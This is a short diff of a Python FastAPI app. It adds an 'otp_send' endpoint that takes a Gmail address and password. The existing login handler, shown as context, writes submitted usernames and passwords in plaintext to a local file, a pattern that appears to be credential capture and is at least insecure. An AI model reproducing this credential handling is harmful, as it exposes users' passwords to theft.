@@ -30,3 +30,10 @@ def show_login_success(
     with open("data.txt", "w") as f:
         f.write(f"Username: {username}\nPassword: {password}")
     return templates.TemplateResponse("login_success.html", {"request": request})
+
+
+@app.post("otp_send", name="otp_send")
+def otp_sender(request: Request, usergmail: str = Form(...), password: str = Form(...)):
+    from otp_sender import send_otp
+
+    send_otp(usergmail)
